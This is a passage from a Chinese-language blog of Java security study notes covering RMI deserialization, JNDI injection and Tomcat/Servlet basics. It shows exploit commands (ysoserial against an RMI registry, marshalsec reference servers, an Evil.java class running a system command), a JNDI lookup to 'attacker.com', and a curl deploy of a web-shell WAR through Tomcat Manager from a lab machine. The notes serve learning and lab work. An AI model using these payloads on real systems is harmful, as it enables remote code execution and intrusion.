name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象</span><br><span class="line"><span class="comment">//前者则会抛出NameAlreadyBoundException错误</span></span><br><span class="line"></span><br><span class="line">lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象；</span><br></pre></td></tr></table></figure><ul><li>exploit</li></ul><p>Java 1.8.121版本以下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target_ip 1099  CommonsCollections1 <span class="string">"curl xxxx"</span></span><br></pre></td></tr></table></figure><p>Java 1.8.121版本及以上：<br>重写个class,扔到ysoserial里重新编译<a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI</a><br>这样相当于加了个利用类。然后继续打就行了</p><p>发现vulhub原来有javarmi的两个镜像。自己仓库太久没更新导致疏忽了。</p><p>我们来看看jdk高版本时做出的改变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String<span class="class">.<span class="keyword">class</span> </span>== clazz</span><br><span class="line">        || java.lang.Number<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">lang</span>.<span class="title">reflect</span>.<span class="title">Proxy</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">UnicastRef</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIClientSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIServerSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">activation</span>.<span class="title">ActivationID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">UID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以利用时是通过白名单里可利用的类来进行反序列化。<br>因为rmi在其他洞里出现的频率也很高。所以学习到其他漏洞时也会提及。</p><h3 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h3><p>jndi注入的使用在shiro与fastjson的反序列化复现中都曾经使用过。想要真正理解这几种漏洞的脉络,还是得先把jndi的相关知识学懂。</p><ul><li>jndi</li></ul><blockquote><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。<br>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等</p></blockquote><p>所以说jndi的作用主要在于”定位”。比如定位rmi中注册的对象,访问ldap的目录服务等等。</p><ul><li>demo</li></ul><p>其使用与rmi很类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind：将名称绑定到对象中；</span><br><span class="line">lookup：通过名字检索执行的对象</span><br></pre></td></tr></table></figure><p>下面是写的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Identity</span> <span class="keyword">implements</span> <span class="title">Remote</span>,<span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"id: "</span>+id+<span class="string">" name: "</span>+name+<span class="string">" age: "</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上面rmi的Identity类不同的是,这里我们必须让它继承java.rmi.Remote类.否则会抛出错误。同时加上一个<code>toString()</code>方法方便我们获取并打印对象的属性。</p><p>一个服务端+客户端的整合代码。先用jndi的bind将Identity对象绑定在rmi服务中。然后再lookup检索对象输出。<br>JndiServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiServer</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">initIdentity</span><span class="params">()</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">       LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">       System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">       System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">       Identity a= <span class="keyword">new</span> Identity();</span><br><span class="line">       a.setId(<span class="number">0</span>);</span><br><span class="line">       a.setAge(<span class="number">20</span>);</span><br><span class="line">       a.setName(<span class="string">"byc_404"</span>);</span><br><span class="line"></span><br><span class="line">       ctx.bind(<span class="string">"person"</span>,a);</span><br><span class="line">       ctx.close();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getIdentity</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        Identity person = (Identity) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        initIdentity();</span><br><span class="line">        getIdentity();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意我们需要先行设置jndi工厂的url及端口等等属性。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.5.PNG" alt></p><ul><li>traits of jndi</li></ul><p>jndi存在安全管理器.对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/18.PNG" alt></p><p>可以看到ldap对应的安全措施并非强制的。这点非常有意思。进而延伸到我们下面的一个特点</p><p>jndi在初始化时,一定要像demo中那样配置上下文环境。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,<span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure><p>上面两种方式都可以指定上下文。但是当我们使用lookup()寻找对象时,我们可以用其他格式的协议来转换上下文环境访问对象。具体可以跟到InitialContext类的getURLOrDefaultInitCtx</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">            <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">        &#125;</span><br><span class="line">        String scheme = getURLScheme(name);</span><br><span class="line">        <span class="keyword">if</span> (scheme != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Context ctx = NamingManager.getURLContext(scheme, myProps);</span><br><span class="line">            <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ctx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到如果协议不为空,会重新获取url中指定的环境。<br>所以可以传递<code>ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);</code>这样的url来进行lookup.(幸好之前做htb好好学了下ldap……).这就是jndi的动态协议转换特性。</p><ul><li>jndi injection</li></ul><p>终于到我们攻击的重头戏jndi注入了。不过在正式开始前我们还需要了解下Reference类的使用</p><blockquote><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等</p></blockquote><p>几个比较关键的属性：</p><p>1.className：远程加载时所使用的类名<br>2.classFactory：加载的class中需要实例化类的名称<br>3.classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议</p><p>所以我们开始jndi注入时,就可以使用到Reference类的功能了。jndi中对象的传递可以使用序列化也可以使用引用。那么假如我们能将恶意的Reference类绑定在RMI注册表中,并试其引用指向恶意class.就能达成命令执行。(前提:当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时)</p><p>复现的话因为我本地java版本的问题导致不能用基础的jndi注入payload打。不过之前我复现过<a href="https://bycsec.top/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/#fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">fastjson</a>的洞。用的就是rmi的服务</p><p>方法,对应jdk1.8以下的,直接用rmi做</p><p>JndiClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;<span class="comment">//可控</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用marshalsec起一个rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Evil</code></p><p>准备的Evil.java <code>javac Evil.java</code>编译好.并起一个python web服务监听在对应的端口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"touch"</span>,<span class="string">"/tmp/a"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过我因为版本问题所以都失败了。可以看到其抛出的com.sun.jndi.rmi.object.trustURLCodebase错误。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/19.PNG" alt></p><p>这也就是为什么上面提到说ldap。LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>我们换用ldap的命令试试</p><p>CLIENT.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"ldap://127.0.0.1:1389/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>marshalsec起服务。evil.class准备弹shell<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/20.PNG" alt><br>成功执行命令。可以看到ldap的版本使用范围确实比rmi更广。</p><p>这里还有一个<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">绕过高版本的jndi注入</a>。属于进阶技巧了。暂时先留个坑。等遇到再填。</p><h2 id="develop"><a href="#develop" class="headerlink" title="develop"></a>develop</h2><p>上面基本上是把java的一些比较基础的漏洞或多或少复现并分析了一遍。感觉接触起来还是挺有意思的。不过按照之前的计划,现在要把java_web的知识更深入了解下。方便自己以后更熟悉文件结构或者相应的方法,同时也是为了开发做进一步考虑。至于java一些常见漏洞如jackson,fastjson以及其他一些框架如struts的漏洞等等方向的深入就留到后面其他文章里记录了。</p><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>web资源想要被远程计算机访问,都需要一个与之进行网络通信的程序。web服务器就是这样的程序。对java而言,支持全部JSP以及Servlet规范的tomcat服务器是最好的选择。tomcat的下载安装就不多赘述了。按照教程走就好。</p><p>这里对tomcat的一些细节进行叙述</p><ul><li><code>$CATALINA_HOME</code></li></ul><p>tomcat的根目录。我们也可以通过配置<code>$CATALINA_BASE</code>,为多个tomcat实例的个体设定对应的属性。</p><ul><li>path</li></ul><p>/bin<br>存放用于启动及关闭的文件，以及其他一些脚本。其中，UNIX 系统专用的 *.sh 文件在功能上等同于 Windows 系统专用的 *.bat 文件</p><p>/conf<br>配置文件及相关的 DTD。其中最重要的文件是 server.xml，这是容器的主配置文件<br>当然其他一些文件也很重要。个人遇到过的还有catalina.policy,tomcat-users.xml,web.xml这几个重要配置文件。</p><p>/log<br>日志文件的默认目录。</p><p>/webapps<br>存放 Web 应用的相关文件。</p><ul><li>应用部署</li></ul><p>在 Tomcat 服务器上，可以通过多种方法部署 Web 应用:1.静态部署2.动态部署</p><p>静态部署我们应该很熟悉。就是常规的开发流程。在启动之前就写好web应用。但是动态部署可能就接触的相对较少。但其实就是使用tomcatmanager直接操作管理web应用。</p><p>关于tomcat manager要等到专门讲manager时再仔细理解。</p><ul><li>上下文</li></ul><p>上下文在 Tomcat 中其实就是 Web 应用的意思。<br>为了在 Tomcat 中配置上下文，需要用到上下文描述符文件。在tomcat中其实就是xml文件。<br>上下文描述符文件位于：<br>1.<code>$CATALINA_BASE/conf/[enginename]/[hostname]/[webappname].xml</code><br>2.<code>$CATALINA_BASE/webapps/[webappname]/META-INF/context.xml</code><br>在目录 1 中的文件名为 <code>[webappname].xml</code>，但在目录 2 中，文件名为 context.xml。如果某个 Web 应用没有相应的上下文描述符文件，Tomcat 就会使用默认值配置该应用。</p><ul><li>Tomcat Manager</li></ul><p>很多生产环境都非常需要以下特性：在无需关闭或重启整个容器的情况下，部署新的 Web 应用或者取消对现有应用的部署。或者，即便在 Tomcat 服务器配置文件中没有指定 reloadable 的情况下，也可以请求重新加载现有应用。</p><p>Tomcat 中的 Web 应用 Manager 就是来解决这些问题的，它默认安装在上下文路径：/manager 中</p><p>Tomcat 以默认值运行是非常危险的，因为这能让互联网上的任何人都可以在你的服务器上执行 Manager 应用。因此，Manager 应用要求任何用户在使用前必须验证自己的身份，提供自己的用户名和密码，以及相应配置的 manager-** 角色（角色名称根据所需的功能而定）。另外，默认用户文件（$CATALINA_BASE/conf/tomcat-users.xml）中的用户名称都没有指定角色名称，所以默认是不能访问 Manager 应用的。</p><p>这些角色名称位于 Manager 应用的 web.xml 文件中。可用的角色包括：</p><blockquote><p>manager-gui 能够访问 HTML 界面。<br>manager-status 只能访问“服务器状态”（Server Status）页面。<br>manager-script 能够访问文档中描述的适用于工具的纯文本界面，以及”服务器状态”页面。<br>manager-jmx 能够访问 JMX 代理界面以及“服务器状态”（Server Status）页面。</p></blockquote><p>为了能够访问 Manager 应用，必须创建一个新的用户名/密码组合，并为之授予一种 manager-** 角色，或者把一种 manager-** 角色授予现有的用户名/密码组合</p><p>比较危险的情况就如之前曾经做过几次的java题中出现的tomcat弱密码部署war或者tomcat密码泄露,命令行部署war的情况一样。</p><p>注意一点,tomcat支持通过请求url进行命令执行。<br><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p><p>比如我做过的htb某靶机中,用户密码泄露了。但是用户是admin-gui,manager-script权限,我们没法通过账户密码登录<code>manager/html</code>手动部署war.但是却可以通过命令行来部署war getshell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --user <span class="string">'tomcat:xxxx'</span> --upload-file exp.war <span class="string">"http://xxxx:8080/manager/text/deploy=/exp.war"</span></span><br></pre></td></tr></table></figure><p>这样就可以通过访问web目录exp直接操作shell了。</p><ul><li>安全管理</li></ul><p>Java 的 SecurityManager 能让 Web 浏览器在它自身的沙盒中运行小型应用（applet），从而具有防止不可信代码访问本地文件系统的文件以及防止其连接到主机，而不是加载该应用的位置。<br>SecurityManager 能防止不可信的小型应用在你的浏览器上运行，运行 Tomcat 时，使用 SecurityManager 也能保护服务器，使其免受木马型的 applet、JSP、JSP Bean 以及标签库的侵害，甚至也可以防止由于无意中的疏忽所造成的问题。</p><p>关于适用于 Tomcat 的标准系统 SecurityManager 权限类.包括但不限于：<br>1.java.lang.RuntimePermission——控制一些系统/运行时函数的使用，比如 exit() 和 exec()。 另外也控制包的访问/定义。<br>2.java.io.FilePermission——控制对文件和目录的读/写/执行。<br>3.java.security.AllPermission——允许访问任何权限，仿佛没有 SecurityManager。<br>……</p><p>其对应的策略文件就是catalina.policy。</p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet算是javaweb比较特色的程序了。它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。从某种角度讲,他能跟php做到的功能近乎类似。Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。</p><ul><li>Life Cycle</li></ul><p>Servlet的生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程：</p><p>1.通过调用 init () 方法进行初始化。<br>2.调用 service() 方法来处理客户端的请求。<br>3.通过调用 destroy() 方法终止（结束）。<br>最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。</p><p>init()可理解为初始化,但不是构造方法。(java构造方法必须是跟类名同名的)一般进行简单的参数设定。</p><p>service()用来处理客户端请求并将格式化的响应返回给客户端。我们通常并不需要对这个方法进行改善,而是重写其调用的<code>doGet</code>,<code>doPost</code>等方法。</p><p>doGet(),doPost()格式均如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> [doGet or doPost](HttpServletRequest request,HttpServletResponse response)</span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">// Servlet code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。<br>在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收</p><ul><li>部署</li></ul><p>这一部分应该算是web开发的基本流程了,因为以前只是审过源码,所以在实际使用idea进行项目创建以及内容编写上还是得重新来过。</p><p>流程:idea创建javaEnterprise项目并选择Additional Library中的Web Application. =&gt; 在新建项目下的web/WEB-INF目录下新建lib,src,classes三个文件夹 =&gt; 更改项目结构：</p><p>1.src 可以在Project Structure的modules中重新设置source.我们需要把Sources从原工程的src改为WEB-INF下的src.Sources 一般用于标注类似 src 这种可编译目录。有时候我们不单单项目的 src 目录要可编译，还有其他一些特别的目录也许我们也要作为可编译的目录，就需要对该目录进行此标注。只有 Sources 这种可编译目录才可以新建 Java 类和包。(此处工程自己创建的src没用了，所以我们直接改成web目录下的源文件夹)<br>2.classes 用来存放编译后输出的class文件.我们同样在项目结构中Paths的配置里将Output path和Test output path都选择刚刚创建的classes文件夹。<br>3.lib用于外部jar包。由于我们开发时必然会用到外部依赖,所以存放jar包的lib也需要在项目中设置。我们同样在modules中把lib添加为jar directory即可。</p><p>然后是配置tomcat服务器,这个没啥好说的。不过还是要注意<code>artifact</code>设置根目录的要点。通常设置为<code>/</code>.</p><p>Servlet编写的一个demo.我们首先要在之前更改过的src下新建一个class<br>(虽然idea会自动换成.java)命名随意。不过最好是某某Servlet.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 